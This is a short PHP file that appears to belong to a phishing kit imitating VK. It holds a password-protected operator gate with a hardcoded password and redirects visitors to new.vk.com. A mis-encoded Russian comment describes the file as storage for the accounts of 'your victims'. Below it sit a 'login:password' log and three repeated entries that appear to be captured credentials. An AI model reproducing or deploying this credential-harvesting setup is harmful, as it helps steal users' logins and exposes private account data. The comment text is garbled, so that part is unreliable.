<?php

/**
 * @author Litvinov V.A.
 * @copyright 2016 (2707)
 */
 if(!empty($_POST['paswd'])){
     $pass = "V&zjmomqUHsU&4thUS";
    if($_POST['paswd']==$pass){
      session_start();
      $_SESSION['access']=true;
      header("Location: demon.php") ;
    }
    else {
       echo 'Вы ввели не верный пароль';
    }
  }
  else
  {
    ?>
    <form method="POST">
      <input type="text" name="paswd">
      <input type="submit">
    </form>
  <?php
  }
?>
<?php
$LOCATION="https://new.vk.com";
header("Location:$LOCATION");

// Â äàííîì ôàéëå áóäóò õðàíèòñÿ ó÷¸òíûå çàïèñè Âàøèõ æåðòâ.
// Äëÿ ïðîñìîòðà íåîáõîäèì ôàéëîâûé ìåíåäæåð (FileZilla).

?>:login:password:

fantomas:8AQRCWFrCK2zJvc2(Q:
fantomas:8AQRCWFrCK2zJvc2(Q:
fantomas:8AQRCWFrCK2zJvc2(Q:
